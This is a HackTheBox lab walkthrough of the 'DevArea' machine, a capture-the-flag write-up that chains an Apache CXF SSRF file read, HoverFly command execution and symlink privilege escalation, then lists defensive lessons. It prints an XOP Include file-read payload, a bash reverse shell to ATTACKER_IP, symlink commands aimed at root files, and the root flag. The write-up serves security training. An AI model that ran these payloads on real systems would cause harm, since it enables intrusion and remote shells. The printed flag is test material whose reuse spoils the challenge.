# HackTheBox - DevArea Walkthrough

## Overview

  Field      Value
  ---------- ------------
  Platform   HackTheBox
  Machine    DevArea
  OS         Linux

------------------------------------------------------------------------

## Enumeration

Initial enumeration revealed services running on:

    22 - SSH
    80 - HTTP
    8080 - Apache CXF Employee Service

------------------------------------------------------------------------

# Initial Access

## Apache CXF SSRF

The application was running Apache CXF SOAP service.

The service was vulnerable to:

    CVE-2022-46364

The vulnerability allows SSRF using XOP Include inside SOAP requests.

Example payload:

``` xml
<xop:Include href="file:///etc/systemd/system/hoverfly.service"/>
```

This allowed reading internal files.

------------------------------------------------------------------------

## Reading Service Configuration

The leaked service file revealed:

    User=dev_ryan
    ExecStart=/opt/HoverFly/hoverfly

Credentials for HoverFly were discovered.

------------------------------------------------------------------------

# HoverFly RCE

The running HoverFly version was vulnerable:

    CVE-2025-54123

Using the vulnerable middleware endpoint, command execution was
achieved.

Reverse shell:

``` bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Shell obtained:

    dev_ryan

------------------------------------------------------------------------

# Privilege Escalation

Check sudo permissions:

``` bash
sudo -l
```

Allowed:

    /opt/syswatch/syswatch.sh

The script contained insecure log handling.

A symlink chaining attack allowed reading root files.

Example:

``` bash
ln -s /root/root.txt disk.log
ln -s disk.log evil.log
```

------------------------------------------------------------------------

# Root Flag

``` bash
cat /root/root.txt
```

    08d5e2fae9e9bfb80142f58da40b0c84

------------------------------------------------------------------------

# Lessons Learned

-   Validate SOAP XML input properly.
-   Avoid vulnerable Apache CXF versions.
-   Avoid executing user-controlled commands.
-   Validate symbolic links before reading files.
